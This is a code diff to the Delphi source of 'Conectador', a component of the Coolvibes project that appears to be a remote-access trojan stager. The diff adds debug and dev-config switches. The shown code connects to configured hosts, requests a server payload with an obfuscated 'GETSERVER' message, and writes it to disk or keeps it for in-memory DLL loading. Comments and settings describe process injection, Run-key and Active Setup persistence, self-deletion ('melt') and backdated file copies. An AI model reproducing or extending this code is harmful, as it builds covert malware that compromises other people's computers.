@@ -11,6 +11,11 @@
 
      El equipo Coolvibes
 *)
+
+//Config del release
+//{$define DevConfig}
+//{$define Debug}
+
 //library Conectador; //Descomentar para crear conectador.dll, ésta dll será inyectada por Jeringa.exe en un proceso
 program Conectador; //Para no inyectar en ningún proceso
 
@@ -19,6 +24,11 @@ uses
   ShellApi,
   Shfolder,
   WinSock,
+
+  {$ifdef Debug}
+    Dialogs,
+  {$endif}
+
   BTMemoryModule in 'BTMemoryModule.pas', //Para cargar una DLL en memoria sin escribir en disco, creditos dentro
   MiniReg in 'MiniReg.pas',
   SettingsDef in 'SettingsDef.pas',
@@ -155,7 +165,6 @@ var
   TotalRead: Integer;
   CurrRead: Integer;
   CurrWritten: Integer;
-  ByteArray: array[0..1023] of char;
   ArchivoRecibido : Ansistring;
   i : integer;
 begin
@@ -181,7 +190,6 @@ begin
       Enviar := 'GETSERVER|' + IntToStr(clavecifrado1) + '|' + IntToStr(clavecifrado2) + '|' + #10#15#80#66#77#1#72#87;
       Send(lSocket, Enviar[1], Length(Enviar), 0); //Pedimos el tamaño del servidor
       desco := False;
-      iRecv := 0;
       ZeroMemory(@buf, SizeOf(buf));
       iRecv := Recv(lSocket, buf, SizeOf(buf), 0); //Tenemos que leer el MAININFO
       while (iRecv > 0) do
@@ -254,12 +262,12 @@ begin
           if(EscribirADisco) then
             BlockWrite(plugin, buf, currRead, currwritten)
           else
-          begin
             ArchivoRecibido[i] := buf[0];
-          end;
+
           currwritten := currRead;
         end;
-      if(EscribirADisco) then
+
+      if (EscribirADisco) then
         CloseFile(plugin);
     end;
 
@@ -284,6 +292,10 @@ begin
   //Leerlo de la config?
   if ReadSettings(ConfigLeida) = True then //Como no estoy injectado puedo leer la configuracion como siempre
     begin
+      {$ifdef Debug}
+        ShowMessage('Conectador: ReadSettings OK');
+      {$endif}
+
       Configuracion.sHosts := ConfigLeida^.sHosts;
       Configuracion.sID := ConfigLeida^.sID;
       Configuracion.bCopiarArchivo := ConfigLeida^.bCopiarArchivo;
@@ -304,6 +316,10 @@ begin
 
       if (MCompartida <> 0) then //Leida con Éxito :D
         begin
+          {$ifdef Debug}
+            ShowMessage('Conectador: MCompartida OK');
+          {$endif}
+
           ConfigCompartida := MapViewOfFile(Mcompartida, FILE_MAP_READ, 0, 0, 0);
           //Quizás habría que guardar esta configuración cifrada...
           Configuracion.sHosts := ConfigCompartida.sHosts;
@@ -325,30 +341,35 @@ begin
       else
         begin
           //Para Debug
-          //Exitprocess(0);
-
+          {$ifdef DevConfig}
           Configuracion.sHosts                  := 'localhost:3360¬';
-          Configuracion.sID                     := 'v';
+          Configuracion.sID                     := 'Coolserver';
           Configuracion.bCopiarArchivo          := false;
-          Configuracion.sFileNameToCopy         := 'w.exe';
+          Configuracion.sFileNameToCopy         := 'coolserver.exe';
           Configuracion.sCopyTo                 := '%AppDir%\';
           Configuracion.bCopiarConFechaAnterior := False;
           Configuracion.bMelt                   := False;
           Configuracion.bArranqueRun            := false;
-          Configuracion.sRunRegKeyName          := 'w';
+          Configuracion.sRunRegKeyName          := 'Coolserver';
           Configuracion.bArranqueActiveSetup    := false;
-          Configuracion.sActiveSetupKeyName     := '{t';
+          Configuracion.sActiveSetupKeyName     := 'blah-blah-blah-blah';
           Configuracion.sPluginName             := 'NOESCRIBIRADISCO';
           //Configuracion.sInyectadorFile         := '';
-          //Fin de Para debug
+          {$else}
+            {$ifdef Debug}
+              ShowMessage('Conectador: No config');
+            {$endif}
+
+            Exitprocess(0);
+          {$endif}
         end;
     end;
 
   dllc := GetCurrentDirectory+Configuracion.sPluginName;
-  if (Configuracion.sPluginName = 'NOESCRIBIRADISCO') then
-    EscribirADisco := false
-  else
     EscribirADisco := true;
+  if (Configuracion.sPluginName = 'NOESCRIBIRADISCO') then
+    EscribirADisco := false;
+
   ClaveCifrado1 := Ord(Configuracion.shosts[Length(Configuracion.shosts) - (Length(Configuracion.shosts) div 2) + 1]);
   ClaveCifrado2 := Ord(Configuracion.shosts[Length(Configuracion.shosts) - (Length(Configuracion.shosts) div 2)]);
 end;
